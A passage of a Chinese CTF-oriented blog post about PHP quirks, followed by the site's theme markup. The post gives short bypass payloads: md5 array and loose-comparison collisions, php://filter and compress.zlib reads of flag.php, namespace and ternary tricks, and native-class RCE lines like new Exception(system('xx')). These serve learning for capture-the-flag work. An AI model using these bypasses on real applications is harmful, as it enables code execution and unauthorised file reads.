+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = Array();</span><br><span class="line">$b = Array();</span><br><span class="line"></span><br><span class="line">md5($a) == md5($b); // null == null true</span><br><span class="line">md5($a) === md5($b); // null === null true</span><br></pre></td></tr></table></figure>
+
+<p>sha1 同理</p>
+<h4 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h4><p>eg:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ctfshow - web97</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">    if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">        if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">            echo $flag;</span><br><span class="line">    else</span><br><span class="line">        print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"># a[]=1&amp;b[]=2 -&gt; 弱类型比较可以直接数组绕过，其结果都会转换为null</span><br></pre></td></tr></table></figure>
+
+<p>如果进行了 string 强制转类型后，则不再接受数组，以下为弱碰撞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"># a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure>
+
+<p>强碰撞则不为特性，这时需要找到两个真正的 md5 值相同数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"># 使用使用 fastcoll / hashclash 工具进行md5碰撞生成相同md5但不通变量值的内容</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="函数与数字运算"><a href="#函数与数字运算" class="headerlink" title="函数与数字运算"></a>函数与数字运算</h3><p>在 PHP 中, 函数与数字进行运算的时候, 函数能够被正常执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+phpinfo()+1;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * / &amp; |` 都行, 另外还有 `&amp;&amp; ||</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="三目运算符构造语句"><a href="#三目运算符构造语句" class="headerlink" title="三目运算符构造语句"></a>三目运算符构造语句</h3><p>有时候构造不带分号 payload 时需要用到三目运算符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">return 1 ? phpinfo():1;</span><br><span class="line">(&lt;条件&gt; ? 参数_1 : 参数_2)</span><br></pre></td></tr></table></figure>
+
+<p>1 永远为 true, 于是正常执行 phpinfo</p>
+<h3 id="根命名空间-绕过过滤"><a href="#根命名空间-绕过过滤" class="headerlink" title="根命名空间 绕过过滤"></a>根命名空间 绕过过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 的命名空间默认为 \, 所有的函数和类都在 \ 这个命名空间中, 如果直接写函数名 function_name() 调用, 调用的时候其实相当于写了一个相对路径; 而如果写 \function_name() 这样调用函数. 则其实是写了一个绝对路径. 如果你在其他 namespace 里调用系统类, 就必须写绝对路径这种写法.</span><br></pre></td></tr></table></figure>
+
+<p>有时候可以绕过一些正则, 比如执行的代码不允许以字母开头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\phpinfo();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext()"></a>gettext()</h3><p>不含字母数字的函数:<code>_()</code> 为 gettext() 别名, 类似于 echo 输出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(call_user_func(call_user_func(&quot;_&quot;, &quot;get_defined_vars&quot;)));</span><br></pre></td></tr></table></figure>
+
+<p>以上命令可以返回所有已定义变量</p>
+<h3 id="GLOBALS-和-get-defined-vars"><a href="#GLOBALS-和-get-defined-vars" class="headerlink" title="$GLOBALS 和 get_defined_vars()"></a>$GLOBALS 和 get_defined_vars()</h3><p><code>$GLOBALS</code> 引用全局作用域中可用的全部变量</p>
+<p>get_defined_vars() 返回由所有已定义变量所组成的数组</p>
+<p>有时候可以从这里面查看 <code>$flag</code></p>
+<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>常见的 php:&#x2F;&#x2F;filter php:&#x2F;&#x2F;input data:&#x2F;&#x2F; 都很熟悉了</p>
+<p>下面是一些不是很常见的 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://flag.php</span><br><span class="line">php://filter/ctfshow/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>php:&#x2F;&#x2F;filter 遇到不存在的过滤器会直接跳过, 可以绕过一些对关键字的检测</p>
+<h3 id="无参数函数读文件-RCE"><a href="#无参数函数读文件-RCE" class="headerlink" title="无参数函数读文件 &#x2F;RCE"></a>无参数函数读文件 &#x2F;RCE</h3><p>无参数函数指形如 <code>a(b(c()))</code> 这种不需要参数或者只需要一个参数, 并且对应的参数可以通过另一个函数的返回值来获取的函数</p>
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args, string $code): string</span><br></pre></td></tr></table></figure>
+
+<p>create_function(string $args, string $code): string</p>
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(callable $callback, mixed ...$args): mixed</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="原生类列目录-RCE"><a href="#原生类列目录-RCE" class="headerlink" title="原生类列目录 &#x2F;RCE"></a>原生类列目录 &#x2F;RCE</h3><p>一般都是 <code>echo new $v1($v2(&#39;xxx&#39;))</code> 或者 <code>eval($v(&#39;ctfshow&#39;))</code> 的形式, 有时候可以跳出来执行其它代码</p>
+<p>ReflectionClass 和 Exception 里面可以执行其它函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new Exception(system(&#x27;xx&#x27;))</span><br><span class="line">new ReflectionClass(system(&#x27;xx&#x27;))</span><br><span class="line">new FilesystemIterator(getcwd())</span><br><span class="line">new ReflectionClass(&#x27;stdClass&#x27;);system()//</span><br></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="属性类型不敏感"><a href="#属性类型不敏感" class="headerlink" title="属性类型不敏感"></a>属性类型不敏感</h3><p>在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感。</p>
+<p>因为 protected 和 private 反序列化后的结果中含有 <code>%00</code>, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制。</p>
+<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p>该机制中的缓存可被文件包含和反序列化恶意利用。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Qiu</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Qiu-lan.github.io/2025/04/20/php%E7%89%B9%E6%80%A7/">https://Qiu-lan.github.io/2025/04/20/php%E7%89%B9%E6%80%A7/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Qiu</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: null,
+        id: '2025-04-20T20-15-18',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2025/04/20/php%E7%89%B9%E6%80%A7/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="PHP特性">
+                        
+                        <span class="card-title">PHP特性</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Qiu
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/03/28/%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="常见脚本">
+                        
+                        <span class="card-title">常见脚本</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Qiu
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <a href="/about" target="_blank">Qiu</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2021908332@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
